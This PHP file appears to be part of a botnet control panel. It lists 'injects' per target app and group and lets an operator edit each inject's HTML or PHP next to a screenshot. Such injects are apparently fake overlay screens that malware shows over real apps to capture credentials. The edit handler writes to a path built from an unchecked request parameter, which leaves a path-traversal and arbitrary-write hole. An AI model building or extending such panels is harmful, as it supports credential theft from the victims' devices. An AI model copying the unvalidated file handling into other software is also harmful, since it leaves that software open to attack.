<?php
include("lib.php");
include("config.php");

$link = mysql_connect('localhost', $_DB['user'], $_DB['password']);
mysql_query('use general', $link);

if(isset($_GET['edit']))
{
	
?>
<div class="container" style='margin-top: 10px'>
	<div class='row'>
		<div class='col-md-12'>
			<a href='?action=injects_list'><button class='button green'>Back to list</button></a><br /><br />
		</div>
	</div>

<?php

	$pkg = $_GET['edit'];
	$path = "../../base/bot/injects/{$pkg}/index.php";
	if(!file_exists($path))
		$path = "../../base/bot/injects/{$pkg}/index.html";
		
	if(!file_exists($path))
		die("wrong file");
		
	if(isset($_POST['new_data']))
	{
		file_put_contents($path, trim($_POST['new_data']));
		echo html_msg("File updated");
	}
	
	$data = file_get_contents($path);
	$img = file_get_contents("../../base/bot/injects/{$pkg}/screen.png");
	$img_data = base64_encode($img);
	
	echo <<<PHP
	<form method='post' action='?action=injects_list&edit={$pkg}'>
	<div class='row'>
		<div class='col-md-12'>
			<h2>Edit {$pkg}</h2>
		</div>
	</div>
	<table border='0' style='width: 100%'>
	<tr valign='top'>
		<td>
			<textarea style='width: 800px; height: 400px' name='new_data'>{$data}</textarea><br /><br />
			<input type='submit' class='button blue' value='Save' />
		</td>
		<td>
			<img src='data:image/png;base64,{$img_data}' style='width: 600px' />
		</td>
	</tr>
	</table>
	
	</form>
</div>
PHP;

	die;
}

?>

<div class="container" style='margin-top: 10px'>
	<div class='row'>
		<div class='col-md-2'>&nbsp;</div>
		<div class='col-md-5'>
<?php
	$res = mysql_query("SELECT id, title from groups") or die(mysql_error());
	
	$groups = array();
	$list = '';
	while($data = mysql_fetch_assoc($res))
	{
		$groups[] = $data;
		if($data['title'] != 'custom' && $data['title'] != 'us')
			$list .= $data['title'].", ";
	}
	$list = substr($list, 0, strlen($list)-2);
	
	echo <<<PHP
<div class="box grid_12">
	<div class="box-head"><h2>All injects</h2></div>
	<div class='box-content'>
		Total: {$list}
	</div>
</div>
PHP;
	
	foreach($groups as $data)
	{
		$group_id = $data['id'];

		$res2 = mysql_query("SELECT id, app, folder from injects where group_id={$group_id}") or die(mysql_error());
		$html = '<ul>';
		$total = 0;
		$ids = '';
		while($data2 = mysql_fetch_assoc($res2))
		{
			$ids .= $data2['id']."<br />";
			$html .= "<li><a href='?action=injects_list&edit={$data2['folder']}' title='#{$data2['id']}'>{$data2['app']}</a></li>";
			$total++;
		}
		
		$html .= '</ul>';
		
		$height = round($total * 15) + 10;
echo <<<PHP
<div class="box grid_6">
	<div class="box-head"><h2>{$data['title']} ({$total})</h2></div>
	<div class='box-content'>
		<!-- <div class="box grid_1"><div class='box-content' style='font-size: 11pt'>{$ids}</div></div> -->
		<div class="box grid_11"><div class='box-content'>{$html}</div></div>
	</div>
</div>
PHP;
		//echo "<br /><h3>{$data['title']} ({$total})</h3>" . $html;
		
		//<textarea onclick='this.select()' style='width: 100%; height: {$height}px'></textarea>
	}
?>
</div>
		<div class='col-md-5'>&nbsp;</div>
	</div>
</div>
